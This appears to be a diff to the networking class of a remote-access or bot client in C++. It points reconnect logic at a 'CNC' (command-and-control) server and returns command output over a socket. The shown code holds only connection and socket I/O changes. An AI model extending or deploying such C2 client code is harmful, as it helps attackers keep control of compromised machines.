@@ -1,4 +1,5 @@
 #include <boost/asio.hpp>
+#include "config.h"
 #include "client.h"
 
 using boost::asio::ip::tcp;
@@ -16,12 +17,12 @@ void Client::Connect()
 	catch (boost::system::system_error&)
 	{
 		m_sock.close();
-		Sleep(30 * 1000);
+		Sleep(RECONNECT_TO_CNC_INTERVAL_IN_SECONDS * 1000);
 		Connect();
 	}
 }
 
-void Client::Send(std::string&& data)
+void Client::Send(std::string data)
 {
 	if (data.empty())
 		m_sock.send(boost::asio::buffer("No output."));
@@ -33,5 +34,6 @@ std::string Client::Receive()
 	std::string data;
 	data.resize(1024);
 	m_sock.receive(boost::asio::buffer(data));
+	data.erase(std::find(data.begin(), data.end(), '\0'), data.end());
 	return data;
 }
